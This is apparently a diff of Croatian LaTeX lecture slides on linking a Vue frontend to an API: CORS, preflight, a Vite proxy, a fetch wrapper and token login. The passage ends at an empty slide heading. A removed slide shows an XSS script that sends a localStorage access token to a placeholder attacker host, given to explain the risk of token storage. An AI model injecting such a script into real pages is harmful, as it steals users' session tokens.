@@ -20,7 +20,7 @@
 \end{enumerate}
 
 \vspace{0.6em}
-Prikaz se mijenja kad se podatak promijeni, ali podatke dosad nije imao odakle dobiti. Ovo predavanje spaja klijentski dio s API-jem i vodi korisnika kroz prijavu.
+Korisničko sučelje ima rute i prikaze, ali podatke nema odakle dobiti. Ovo predavanje ga povezuje s API-jem i vodi korisnika od prijave do rada koji traje dulje od vijeka jednog tokena.
 \end{frame}
 
 % ------------------------------------------------------------
@@ -28,636 +28,1110 @@ Prikaz se mijenja kad se podatak promijeni, ali podatke dosad nije imao odakle d
 Nakon ovog predavanja student može:
 
 \begin{itemize}
-  \item objasniti zašto zahtjev koji prolazi iz alata ne prolazi iz preglednika
-  \item postaviti zajedničkog klijenta koji svakom zahtjevu dodaje zaglavlje s tokenom
-  \item napisati tijek prijave od obrasca do spremljenog tokena
-  \item objasniti izbor mjesta na kojem token stoji i što taj izbor nosi
-  \item obnoviti istekli token bez sudjelovanja korisnika
-  \item spriječiti otvaranje prikaza koji prijavljenom korisniku ne pripada
+  \item povezati frontend (klijentski dio) s API-jem kroz jedan sloj za zahtjeve, na izvoru stranice
+  \item voditi prijavu tokenom: spremiti ga, obnoviti kad istekne i otvoriti samo prikaze koji korisniku pripadaju
+  \item objasniti zašto preglednik skripti ne predaje odgovor s drugog izvora
+  \item pretvoriti neuspio odgovor u pogrešku sa statusom i kodom
+  \item obrazložiti izbor mjesta na kojem token stoji i napad koji taj izbor otvara
+  \item odrediti mjesto na kojem se obrađuje koja pogreška
 \end{itemize}
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}{Domena primjera}
-Klub se prijavljuje svojim računom i od tog trenutka radi samo sa svojim natjecateljima i svojim prijavama. Organizator vidi sve.
+Klub se prijavljuje svojim računom i od tog trenutka radi samo sa svojim natjecateljima i prijavama. Organizator vidi prijave svih klubova i jedini uređuje natjecanja.
 
 \vspace{0.9em}
-Backend to već provodi: zahtjev bez tokena dobiva \texttt{401}, a zahtjev nad tuđim zapisom \texttt{403}. Token vrijedi petnaest minuta, a uz njega se izdaje i dugotrajni token kojim se dobiva novi.
+Backend (poslužiteljski dio) to već provodi. Zahtjev bez valjanog \emph{tokena} backend odbija sa statusom \texttt{401}, a zahtjev izvan uloge ili nad tuđim zapisom sa statusom \texttt{403}.
 
 \vspace{0.9em}
-Klijentski dio mora taj tijek voditi tako da korisnik lozinku upiše jednom, a zatim radi bez prekida dok god je prijavljen.
+Uz prijavu backend izdaje dva tokena: kratkotrajan, koji ide uz svaki zahtjev, i dugotrajniji, kojim se dobiva novi par bez lozinke. Korisnik lozinku upisuje jednom i zatim radi bez prekida dok je prijavljen.
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}[fragile]{Zahtjev koji u alatu prolazi (I)}
-U \texttt{/docs} ovaj zahtjev vraća popis natjecatelja:
-
-\begin{lstlisting}
-GET http://localhost:8000/clubs/12/lifters
-Authorization: Bearer <token kluba 12>
-\end{lstlisting}
-
-\vspace{0.5em}
-Isti poziv iz komponente koja se izvodi na \texttt{http://localhost:5173}:
+U Swaggeru, na adresi backenda, zahtjev s tokenom kluba vraća popis natjecanja. Isti zahtjev iz konzole stranice aplikacije, učitane s \texttt{http://127.0.0.1:5173}:
 
 \begin{lstlisting}[language=typescript]
-const res = await fetch('http://localhost:8000/clubs/12/lifters')
+await fetch('http://127.0.0.1:8000/competitions/', {
+  headers: { Authorization: `Bearer ${token}` },
+})
 \end{lstlisting}
 
-\vspace{0.5em}
-Poslužitelj se ne mijenja, zahtjev se ne mijenja, a u konzoli stoji poruka da je zahtjev blokiran.
+\vspace{0.2em}
+U konzoli Chromea:
+
+\begin{lstlisting}
+Access to fetch at 'http://127.0.0.1:8000/competitions/' from
+origin 'http://127.0.0.1:5173' has been blocked by CORS policy:
+Response to preflight request doesn't pass access control check ...
+TypeError: Failed to fetch
+\end{lstlisting}
+
+\vspace{0.2em}
+Backend je isti i zahtjev je isti, a skripta odgovor nije dobila.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Zahtjev koji u alatu prolazi (II)}
-Zahtjev nije blokirao poslužitelj. Blokirao ga je preglednik, i to nakon što je odgovor već stigao.
+\begin{frame}[fragile]{Zahtjev koji u alatu prolazi (II)}
+U zapisniku backenda za taj poziv nema retka s metodom \texttt{GET}. Stoji samo ovaj:
+
+\begin{lstlisting}
+"OPTIONS /competitions/ HTTP/1.1" 405 Method Not Allowed
+\end{lstlisting}
+
+\vspace{0.5em}
+Zahtjev nije odbio backend. Preglednik ga je zaustavio prije slanja: najprije je pitao smije li ga poslati, nije dobio dopuštenje i pravi zahtjev nije poslao.
 
 \vspace{0.9em}
-Razlika je u tome tko šalje. Alat za slanje zahtjeva nema stranicu u ime koje radi. Preglednik ima: stranica je učitana s jedne adrese, a zahtjev ide na drugu.
-
-\vspace{0.9em}
-Preglednik u toj situaciji štiti korisnika od stranice koju je upravo otvorio. To pravilo opisuje prva cjelina.
+Alat i preglednik razlikuju se po tome u čije ime šalju. Alat ne radi u ime nijedne stranice. Preglednik radi u ime stranice koju je korisnik otvorio i štiti korisnika od nje.
 \end{frame}
 
 % ============================================================
-\sekcija{Zahtjev iz preglednika}{Pravilo istoga izvora, zaglavlja kojima poslužitelj dopušta iznimku, predzahtjev i postavljanje dopuštenja.}
+\sekcija{Zahtjev iz preglednika}{Izvor stranice, pravilo istoga izvora, dopuštenje i predzahtjev, posrednik na izvoru stranice.}
 
 % ------------------------------------------------------------
-\begin{frame}{Pravilo istoga izvora}
-Izvor stranice čine tri podatka: shema, ime domaćina i vrata. \texttt{http://localhost:5173} i \texttt{http://localhost:8000} razlikuju se u vratima, pa su dva izvora.
+\begin{frame}{Izvor stranice}
+Izvor (engl. \emph{origin}) stranice čine tri podatka iz adrese: shema, ime domaćina i vrata. Putanja i upit ne ulaze u izvor. Za stranicu učitanu s \texttt{http://127.0.0.1:5173}:
 
-\vspace{0.9em}
-Skripta učitana s jednog izvora po pravilu ne smije čitati odgovore s drugoga. To se pravilo naziva \textbf{pravilo istoga izvora} (engl. \emph{same-origin policy}).
+\vspace{0.7em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}L{6.9cm}L{1.6cm}L{2.6cm}@{}}
+  \toprule
+  \textbf{Adresa} & \textbf{Izvor} & \textbf{Razlikuje se} \\
+  \midrule
+  \texttt{http://127.0.0.1:5173/natjecanja} & isti & ništa \\
+  \texttt{http://127.0.0.1:8000/competitions/} & drugi & vrata \\
+  \texttt{https://127.0.0.1:5173/} & drugi & shema \\
+  \texttt{http://localhost:5173/} & drugi & ime domaćina \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
 
-\vspace{0.9em}
-Bez njega bi stranica koju korisnik otvori mogla u njegovo ime slati zahtjeve svakoj aplikaciji u koju je prijavljen i čitati ono što dobije.
+\vspace{0.6em}
+Imena \texttt{localhost} i \texttt{127.0.0.1} vode na isto računalo, ali preglednik izvore uspoređuje kao tekst, pa su to dva izvora.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Dopuštenje koje daje poslužitelj}
-Pravilo ima iznimku i daje je poslužitelj. Uz odgovor šalje zaglavlje kojim imenuje izvore kojima dopušta čitanje:
+\begin{frame}{Pravilo istoga izvora}
+Korisnik je u jednoj kartici prijavljen u \emph{webmail}, a u drugoj otvori nepoznatu stranicu. Kad bi skripta te stranice smjela čitati odgovore s bilo kojeg izvora, mogla bi u ime korisnika dohvatiti njegovu poštu i poslati je dalje.
+
+\vspace{0.9em}
+Preglednik zato skripti predaje samo odgovore s izvora s kojeg je stranica došla. To je \textbf{pravilo istoga izvora} (engl. \emph{same-origin policy}).
+
+\vspace{0.9em}
+Pravilo ograničava čitanje odgovora, a slanje mnogih zahtjeva ne zaustavlja. Zato ne zamjenjuje provjeru prava na poslužitelju.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Dopuštenje poslužitelja}
+Iznimku od pravila daje poslužitelj kojemu zahtjev ide. Uz odgovor šalje zaglavlje koje imenuje izvor kojemu se odgovor smije pokazati:
 
 \begin{lstlisting}
 HTTP/1.1 200 OK
-Access-Control-Allow-Origin: http://localhost:5173
-Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: http://127.0.0.1:5173
 \end{lstlisting}
 
 \vspace{0.5em}
-Preglednik odgovor pokaže skripti samo ako se izvor stranice nalazi u tom zaglavlju. Taj se mehanizam naziva \textbf{CORS}, dijeljenje među izvorima (engl. \emph{cross-origin resource sharing}).
+Preglednik odgovor predaje skripti samo ako je izvor stranice naveden u tom zaglavlju. Mehanizam se zove CORS, dijeljenje među izvorima (engl. \emph{cross-origin resource sharing}).
 
 \vspace{0.5em}
-Dopuštenje time nije postavka klijenta. Zapisuje se na poslužitelju i mijenja se ondje.
+Dopuštenje zapisuje poslužitelj i ondje se mijenja. Klijent ga ne može ni dodati ni zaobići.
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}{Predzahtjev}
-Neke zahtjeve preglednik ne šalje odmah. Prvo pita smije li ih poslati.
+Dio zahtjeva preglednik ne šalje odmah:
 
-\vspace{0.7em}
+\vspace{0.4em}
 \begin{itemize}
   \itemsep0.45em
-  \item \texttt{GET} bez posebnih zaglavlja šalje se izravno, a odgovor se odbacuje ako dopuštenja nema.
-  \item \texttt{POST} s tijelom u JSON-u, \texttt{PATCH}, \texttt{DELETE} i svaki zahtjev s vlastitim zaglavljem, uključujući \texttt{Authorization}, dobivaju prethodno pitanje.
-  \item To je zaseban zahtjev metodom \texttt{OPTIONS}, nazvan \textbf{predzahtjev} (engl. \emph{preflight}).
+  \item Jednostavan zahtjev, na primjer \texttt{GET} bez vlastitih zaglavlja, šalje se odmah. Bez dopuštenja odgovor stigne, ali ga skripta ne dobije.
+  \item Zahtjev s tijelom u JSON-u, metodom \texttt{PATCH} ili \texttt{DELETE} ili sa zaglavljem \texttt{Authorization} preglednik najprije najavljuje zasebnim zahtjevom metodom \texttt{OPTIONS}. To je \textbf{predzahtjev} (engl. \emph{preflight}).
+  \item Tek ako odgovor na predzahtjev dopušta izvor, metodu i zaglavlja, preglednik šalje pravi zahtjev.
 \end{itemize}
 
-\vspace{0.7em}
-Poslužitelj na njega odgovara popisom dopuštenih metoda i zaglavlja. Tek ako se traženo nalazi u tom popisu, preglednik šalje pravi zahtjev.
+\vspace{0.6em}
+Gotovo svaki zahtjev ove aplikacije nosi token u zaglavlju \texttt{Authorization}. Uz dopuštenje bi svakome prethodio predzahtjev, osim dok preglednik pamti odgovor na raniji.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Dopuštenje u aplikaciji}
-U FastAPI-ju dopuštenje postavlja međusloj pri sastavljanju aplikacije:
+\begin{frame}{Posrednik}
+Pošta upućena ustanovi stiže u pisarnicu, koja je prosljeđuje uredu. Pošiljatelj zna jednu adresu, a ured može seliti bez obavijesti pošiljateljima.
 
-\begin{lstlisting}[language=python]
-# app/main.py
-from fastapi.middleware.cors import CORSMiddleware
+\vspace{0.9em}
+\textbf{Posrednik} (engl. \emph{proxy}) na isti način prima zahtjeve na adresi stranice i prosljeđuje ih backendu. Preglednik tada i stranicu i podatke dobiva s istog izvora, pa pravilo istoga izvora ne smeta i dopuštenje nije potrebno.
 
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["http://localhost:5173"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-\end{lstlisting}
-
-\vspace{0.4em}
-Popis izvora navodi se izrijekom. Zvjezdica na tom mjestu dopušta svakoj stranici čitanje odgovora i ne smije ostati u objavljenoj aplikaciji.
+\vspace{0.9em}
+Backend o tome ništa ne zna. Zahtjev mu stiže od posrednika, a ne iz preglednika.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Vježba: zahtjev iz preglednika}
-Backend je pokrenut na \texttt{http://localhost:8000}. Otvorite bilo koju stranicu koja nije na toj adresi, primjerice \texttt{https://www.unizd.hr}, i u njoj konzolu alata za razvoj.
+\begin{frame}{Put zahtjeva do API-ja}
+\begin{center}
+\begin{tikzpicture}[
+  font=\small,
+  kut/.style={draw=lineclr,fill=tint,rounded corners=2pt,inner sep=5pt,minimum height=9mm,align=center},
+  str/.style={-{Stealth[length=2mm]},draw=ink2,thick},
+  stop/.style={-{Stealth[length=2mm]},draw=mutedclr,thick,dashed}
+]
+  \node[kut] (b1) at (0,2.4) {preglednik\\[-2pt]{\scriptsize stranica s :5173}};
+  \node[kut] (s1) at (10.0,2.4) {backend\\[-2pt]{\scriptsize 127.0.0.1:8000}};
+  \draw[stop] (b1.east) -- node[above,font=\scriptsize]{\texttt{OPTIONS} na \texttt{127.0.0.1:8000}}
+                           node[below,font=\scriptsize]{\texttt{405}: \texttt{GET} se ne šalje} (s1.west);
 
-\vspace{0.8em}
-\begin{enumerate}
-  \itemsep0.4em
-  \item Pošaljite \texttt{await fetch('http://localhost:8000/health')} i pročitajte poruku.
-  \item Prijeđite na karticu Mreža i pogledajte je li zahtjev uopće poslan i koji je status vraćen.
-  \item Dodajte u backend međusloj iz ovog predavanja i ponovite prvi korak.
-  \item Promijenite popis dopuštenih izvora u \texttt{["http://example.com"]} i ponovite.
-\end{enumerate}
+  \node[kut] (b2) at (0,0) {preglednik\\[-2pt]{\scriptsize stranica s :5173}};
+  \node[kut] (v) at (5.0,0) {Vite\\[-2pt]{\scriptsize 127.0.0.1:5173}};
+  \node[kut] (s2) at (10.0,0) {backend\\[-2pt]{\scriptsize 127.0.0.1:8000}};
+  \draw[str] (b2.east) -- node[above,font=\scriptsize,align=center]{\texttt{/api/}\\[-2pt]\texttt{competitions/}} (v.west);
+  \draw[str] (v.east) -- node[above,font=\scriptsize,align=center]{\texttt{/competitions/}} (s2.west);
 
-\vspace{0.8em}
-U kojem je koraku zahtjev stigao do poslužitelja, a odgovor ipak nije bio dostupan skripti?
-\end{frame}
+  \node[font=\scriptsize,color=mutedclr] at (5.0,3.35) {izravno, na drugi izvor};
+  \node[font=\scriptsize,color=mutedclr] at (5.0,0.95) {preko posrednika, na izvoru stranice};
+\end{tikzpicture}
+\end{center}
 
-% ============================================================
-\sekcija{Jedno mjesto za slanje zahtjeva}{Posao koji se ponavlja u svakom pozivu, zajednički klijent, tipizirani pozivi i čekanje odgovora.}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Isti posao u svakom pozivu}
-Zahtjev napisan izravno u komponenti nosi i sve što uz njega ide:
-
-\begin{lstlisting}[language=typescript]
-const res = await fetch('http://localhost:8000/clubs/12/lifters', {
-  headers: {
-    'Content-Type': 'application/json',
-    Authorization: `Bearer ${localStorage.getItem('access_token')}`,
-  },
-})
-if (!res.ok) throw new Error(String(res.status))
-const data = await res.json()
-\end{lstlisting}
-
-\vspace{0.4em}
-Adresa poslužitelja, zaglavlja, pretvorba u JSON i provjera statusa isti su u svakom pozivu. Ako stoje u svakoj komponenti, mijenjaju se u svakoj komponenti.
+\vspace{0.5em}
+U donjem putu preglednik ni u jednom koraku ne vidi drugi izvor. Posrednik iz adrese uklanja predmetak \texttt{/api}, pa backend dobiva svoje rute nepromijenjene.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Zajednički klijent}
-Taj se posao opisuje jednom:
-
-\begin{lstlisting}[language=typescript]
-// api/client.ts
-import axios from 'axios'
-
-const api = axios.create({
-  baseURL: import.meta.env.VITE_API_URL,
-  headers: { 'Content-Type': 'application/json' },
-})
-
-export default api
-\end{lstlisting}
-
-\vspace{0.4em}
-Adresa poslužitelja dolazi iz varijable okoline, pa se ista izgradnja koristi i u razvoju i nakon objave. Knjižnica \texttt{axios} uz to sama pretvara tijelo u JSON i podiže iznimku na odgovoru sa statusom \texttt{4xx} ili \texttt{5xx}.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Pozivi po resursu}
-Zahtjevi se grupiraju po resursu, jedna datoteka po skupini, i vraćaju opisane tipove:
-
-\begin{lstlisting}[language=typescript]
-// api/lifters.ts
-import api from './client'
-import type { Lifter } from '@/types'
-
-export async function getLifters(clubId: number): Promise<Lifter[]> {
-  const { data } = await api.get<Lifter[]>(`/clubs/${clubId}/lifters`)
-  return data
-}
-\end{lstlisting}
-
-\vspace{0.4em}
-Komponenta time ne zna ni adresu ni zaglavlja. Zna da postoji funkcija koja vraća popis natjecatelja, i to je sve što joj treba.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Čekanje odgovora}
-Odgovor ne stiže odmah, a prikaz se u međuvremenu ne smije zaustaviti:
-
-\begin{lstlisting}[language=typescript]
-const lifters = ref<Lifter[]>([])
-const loading = ref(false)
-
-async function ucitaj(clubId: number) {
-  loading.value = true
-  try {
-    lifters.value = await getLifters(clubId)
-  } finally {
-    loading.value = false
-  }
-}
-\end{lstlisting}
-
-\vspace{0.4em}
-\texttt{await} zaustavlja samo tu funkciju. Preglednik u tom vremenu i dalje odgovara na klikove, pa stanje \texttt{loading} mora biti vidljivo u prikazu.
-\end{frame}
-
-% ============================================================
-\sekcija{Prijava i token}{Tijek prijave, oblik odgovora, mjesto na kojem token stoji i čime se taj izbor plaća, pohrana prijavljenog korisnika.}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Odgovor na prijavu}
-Prijava je jedan zahtjev. Odgovor nosi dva tokena:
-
-\begin{lstlisting}[language=typescript]
-POST /auth/login
-{"username": "behemot@plreg.hr", "password": "..."}
-\end{lstlisting}
-
-\vspace{0.4em}
-\begin{lstlisting}[language=json]
-{"access_token": "eyJhbGciOi...", "refresh_token": "eyJhbGciOi...",
- "token_type": "bearer"}
-\end{lstlisting}
-
-\vspace{0.4em}
-Prvi putuje uz svaki sljedeći zahtjev i vrijedi petnaest minuta. Drugi se šalje samo na \texttt{/auth/refresh} i vrijedi sedam dana.
-
-\vspace{0.4em}
-Tko je prijavljen, odgovor ne govori. To vraća \texttt{GET /auth/me}, i to iz zapisa u bazi.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Gdje token stoji}
+\begin{frame}{Dopuštenje i posrednik}
 \vspace{0.3em}
 \begin{center}
 {\small
 \setlength{\tabcolsep}{6pt}
 \renewcommand{\arraystretch}{1.3}
-\begin{tabular}{@{}L{3.3cm}L{4.0cm}L{4.0cm}@{}}
+\begin{tabular}{@{}L{2.4cm}L{4.0cm}L{5.0cm}@{}}
   \toprule
-   & \textbf{U memoriji} & \textbf{\texttt{localStorage}} \\
+   & \textbf{Dopuštenje CORS} & \textbf{Posrednik na izvoru stranice} \\
   \midrule
-  Nakon osvježavanja & nestaje & ostaje \\
-  Čita ga skripta & da & da \\
-  Prijava traje & do osvježavanja & do isteka tokena \\
+  Zahtjev ide na & adresu backenda & adresu stranice, pod \texttt{/api} \\
+  Postavka & popis izvora na backendu & pravilo na posredniku \\
+  Predzahtjev & uz zahtjeve s tokenom & ne postoji \\
+  Cijena & popis izvora po okruženju & posrednik u svakom okruženju \\
   \bottomrule
 \end{tabular}
 }
 \end{center}
 
 \vspace{0.6em}
-Obje pohrane skripta čita, pa nijedna ne štiti od napada koji u stranicu ubaci svoju skriptu. Razlikuju se po tome koliko dugo vrijedi ono što napadač uzme.
-
-\vspace{0.4em}
 \begin{konvencija}[Izbor, ne pravilo]
-U ovom projektu oba tokena stoje u \texttt{localStorage}, jer prijava mora preživjeti osvježavanje stranice.
+Oba puta su ispravna. Projekt bira posrednika, jer API i korisničko sučelje izlaze zajedno, pa backend nema postavku za CORS.
 \end{konvencija}
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Napad koji uzima token}
-Stranica koja tuđi tekst prikaže kao HTML dopušta da se uz njega izvede i skripta:
-
-\begin{lstlisting}[language=html]
-<script>
-  fetch('https://zlonamjerna.example/?t='
-        + localStorage.getItem('access_token'))
-</script>
-\end{lstlisting}
-
-\vspace{0.4em}
-Skripta se izvodi u kartici žrtve, s njezinim izvorom, pa joj je dostupno sve što i samoj aplikaciji.
-
-\vspace{0.4em}
-Vue u predlošku svaki izraz ispisuje kao tekst, pa ovakav sadržaj ostane običan niz znakova. Jedina direktiva koja to zaobilazi je \texttt{v-html} i koristi se samo za sadržaj kojemu se vjeruje.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Zašto zaglavlje, a ne kolačić}
-Kolačić preglednik dodaje svakom zahtjevu prema toj domeni, i onda kad zahtjev pokrene tuđa stranica. Obrazac na tuđoj stranici tako može izvesti radnju u ime prijavljenog korisnika.
-
-\vspace{0.9em}
-Token u zaglavlju \texttt{Authorization} preglednik ne dodaje sam. Dodaje ga skripta aplikacije, pa zahtjev koji pokrene tuđa stranica ostaje bez njega.
-
-\vspace{0.9em}
-Cijena je da se o pohrani tokena mora brinuti aplikacija i da prijava ne preživi ništa što obriše tu pohranu.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Podatci o prijavljenom korisniku}
-Token, uloga i oznaka kluba trebaju navigaciji, zaštiti prikaza i gotovo svakom popisu. Takav podatak ne pripada nijednoj komponenti, nego pohrani koju dijele:
-
+\begin{frame}[fragile]{Posrednik u razvoju}
 \begin{lstlisting}[language=typescript]
-// stores/auth.ts
-export const useAuthStore = defineStore('auth', () => {
-  const user = ref<User | null>(null)
-  const token = ref<string | null>(localStorage.getItem('access_token'))
-
-  const prijavljen = computed(() => token.value !== null)
-  const organizator = computed(() => user.value?.role === 'admin')
-
-  return { user, token, prijavljen, organizator }
+// vite.config.ts
+const BACKEND = 'http://127.0.0.1:8000'
+const proxy = {
+  '/api': {
+    target: BACKEND,
+    rewrite: (path: string) => path.replace(/^\/api/, ''),
+  },
+}
+export default defineConfig({
+  ...
+  server: { host: '127.0.0.1', port: 5173, strictPort: true, proxy },
 })
 \end{lstlisting}
 
-\vspace{0.4em}
-\texttt{User} je isti opis koji vraća \texttt{/auth/me}: \texttt{id}, \texttt{username}, \texttt{role}, \texttt{club\_id} i \texttt{is\_active}.
+\vspace{0.3em}
+Razvojni poslužitelj zahtjev na \texttt{/api/competitions/} prosljeđuje backendu kao \texttt{/competitions/}. U produkciji isto pravilo nosi web poslužitelj ispred aplikacije.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Prijava u kodu}
+\begin{frame}[fragile]{Vježba: zahtjev s drugog izvora}
+Backend i razvojni poslužitelj rade. Stranica \texttt{http://127.0.0.1:5173} je otvorena, s konzolom i karticom Mreža.
+
 \begin{lstlisting}[language=typescript]
-async function prijava(username: string, password: string) {
-  const data = await apiLogin(username, password)
-  localStorage.setItem('access_token', data.access_token)
-  localStorage.setItem('refresh_token', data.refresh_token)
-  token.value = data.access_token
-  user.value = await getMe()
+await fetch('http://127.0.0.1:8000/health/')             // A
+await (await fetch('/api/health/')).json()                // B
+await fetch('http://127.0.0.1:8000/health/',
+  { headers: { Authorization: 'Bearer x' } })             // C
+\end{lstlisting}
+
+\begin{enumerate}
+  \itemsep0.15em
+  \item Pošaljite zahtjev A i u kartici Mreža zabilježite je li poslan i s kojim statusom.
+  \item Pošaljite zahtjev B, pa u terminalu backenda usporedite retke koje su ostavili A i B.
+  \item Pošaljite zahtjev C i pronađite njegov redak u terminalu backenda.
+\end{enumerate}
+
+\vspace{0.2em}
+Zašto je backend na zahtjev A odgovorio, a skripta odgovor nije dobila, i zašto uz zahtjev C nema retka s metodom \texttt{GET}?
+\end{frame}
+
+% ============================================================
+\sekcija{Jedno mjesto za slanje zahtjeva}{Posao koji se ponavlja u svakom pozivu, odgovor sa statusom pogreške, sloj nad funkcijom fetch, pozivi po resursu, adresa bez kose crte na kraju i čekanje odgovora.}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Posao koji se ponavlja}
+Zahtjev napisan izravno u komponenti nosi i sve što uz njega ide:
+
+\begin{lstlisting}[language=typescript]
+const token = localStorage.getItem('plreg.access_token')
+const res = await fetch('/api/competitions/?limit=100', {
+  headers: {
+    Accept: 'application/json',
+    Authorization: `Bearer ${token}`,
+  },
+})
+if (!res.ok) throw new Error(String(res.status))
+const competitions = await res.json()
+\end{lstlisting}
+
+\vspace{0.3em}
+Adresa API-ja, zaglavlja, token, provjera statusa i pretvorba iz JSON-a isti su u svakom pozivu.
+
+\vspace{0.3em}
+Kad stoje u svakoj komponenti, mijenjaju se u svakoj komponenti, a u nekoj se zaborave. Komponenta koja zaboravi provjeru statusa tijelo pogreške prikaže kao podatke.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Odgovor sa statusom pogreške}
+\begin{lstlisting}[language=typescript]
+const res = await fetch('/api/nepostojeca-ruta')
+res.ok             // false
+res.status         // 404
+await res.json()   // { code: 'not_found', message: 'Not Found' }
+\end{lstlisting}
+
+\vspace{0.5em}
+Obećanje koje vraća \texttt{fetch} odbija se samo kad odgovora nema: backend ne radi ili veze nema. Odgovor sa statusom \texttt{404} ili \texttt{500} za \texttt{fetch} je uspješno primljen odgovor, a o statusu odlučuje onaj tko odgovor čita.
+
+\vspace{0.5em}
+Knjižnice za zahtjeve, poput axiosa, odgovor sa statusom \texttt{4xx} ili \texttt{5xx} same pretvaraju u iznimku. Uz \texttt{fetch} to radi vlastiti kod, jednom.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Smjer poziva}
+\begin{center}
+\begin{tikzpicture}[
+  font=\small,
+  kut/.style={draw=lineclr,fill=tint,rounded corners=2pt,inner sep=5pt,minimum height=8mm},
+  str/.style={-{Stealth[length=2mm]},draw=ink2,thick}
+]
+  \node[kut] (v) at (0,0) {\texttt{views}, \texttt{components}};
+  \node[kut] (s) at (3.9,0.9) {\texttt{stores}};
+  \node[kut] (r) at (3.9,-0.9) {\texttt{api/<resurs>.ts}};
+  \node[kut] (h) at (7.5,0) {\texttt{api/http.ts}};
+  \node[kut] (f) at (10.2,0) {\texttt{fetch}};
+  \draw[str] (v.east) -- (s.west);
+  \draw[str] (v.east) -- (r.west);
+  \draw[str] (s.south) -- (r.north);
+  \draw[str] (r.east) -- (h.west);
+  \draw[str] (h.east) -- (f.west);
+\end{tikzpicture}
+\end{center}
+
+\vspace{0.5em}
+Pogledi i komponente ne zovu \texttt{fetch}. Zovu funkciju iz \codefile{api/<resurs>.ts} ili pohranu, a jedini poziv \texttt{fetch} u projektu stoji u \codefile{api/http.ts}. Poziv ide samo prema desno: \codefile{http.ts} ne zna za Vue, pohrane ni router.
+
+\vspace{0.4em}
+\begin{konvencija}[Izbor, ne pravilo]
+Projekt koristi \texttt{fetch} bez knjižnice za zahtjeve. Posao koji bi knjižnica radila stoji u jednoj datoteci, koja se može pročitati u cijelosti.
+\end{konvencija}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Adresa API-ja}
+\begin{lstlisting}[language=typescript]
+// src/api/http.ts
+export const API_BASE: string =
+  import.meta.env.VITE_API_URL ?? '/api'
+\end{lstlisting}
+
+\vspace{0.5em}
+Adresa API-ja je relativna, pa zahtjev ide izvoru stranice, a dalje ga nosi posrednik. Svi pozivi u projektu grade adresu od ove vrijednosti.
+
+\vspace{0.5em}
+Kad je API na drugoj adresi, ona se zadaje pri izgradnji varijablom \texttt{VITE\_API\_URL}. Backend tada mora dopustiti izvor stranice, jer posrednika na tom putu nema.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Slanje zahtjeva (I)}
+\begin{lstlisting}[language=typescript]
+// src/api/http.ts
+async function send(method: Method, path: string,
+                    options: RequestOptions): Promise<Response> {
+  const headers: Record<string, string> = {
+    Accept: 'application/json',
+  }
+  if (options.body !== undefined)
+    headers['Content-Type'] = 'application/json'
+  const token = options.auth === false ? null : getAccessToken()
+  if (token) headers.Authorization = `Bearer ${token}`
+  ...  <@\komts{slanje: sljedeći slajd}@>
+}
+\end{lstlisting}
+
+\vspace{0.3em}
+Token dodaje ova funkcija, pa ga nijedan poziv u \codefile{api} ne spominje i nijedan ga ne može zaboraviti. Prijava i obnova šalju \texttt{auth: false}, jer token tek dobivaju.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Slanje zahtjeva (II)}
+\begin{lstlisting}[language=typescript]
+// src/api/http.ts
+async function send(...): Promise<Response> {
+  ...  // zaglavlja i token
+  try {
+    return await fetch(
+      `${API_BASE}${path}${buildQuery(options.query ?? {})}`,
+      { method, headers, body: options.body === undefined
+          ? undefined : JSON.stringify(options.body) })
+  } catch {
+    throw new ApiError(0, {
+      code: 'network_error', message: <@'Poslužitelj nije dostupan. ...'@> })
+  }
+}
+\end{lstlisting}
+
+\vspace{0.1em}
+Bez odgovora nema ni statusa, pa pogreška dobiva status \texttt{0} i kod \texttt{network\_error}.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Pogreška sa statusom i kodom}
+\begin{lstlisting}[language=typescript]
+// src/api/http.ts
+export class ApiError extends Error {
+  readonly status: number
+  readonly code: string
+  readonly fieldErrors: FieldError[]
+  constructor(status: number, body: ErrorBody) {
+    super(body.message)
+    this.name = 'ApiError'
+    this.status = status
+    this.code = body.code
+    this.fieldErrors = body.errors ?? []
+  }
+}
+\end{lstlisting}
+
+\vspace{0.2em}
+Backend uz pogrešku šalje \texttt{code} i \texttt{message}, a uz \texttt{422}, kojim javlja da tijelo ne odgovara shemi, i popis polja \texttt{errors}. Status opisuje ishod zahtjeva, \texttt{code} je stalan i služi grananju obrade, a \texttt{message} je tekst za korisnika.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Odgovor koji nije JSON}
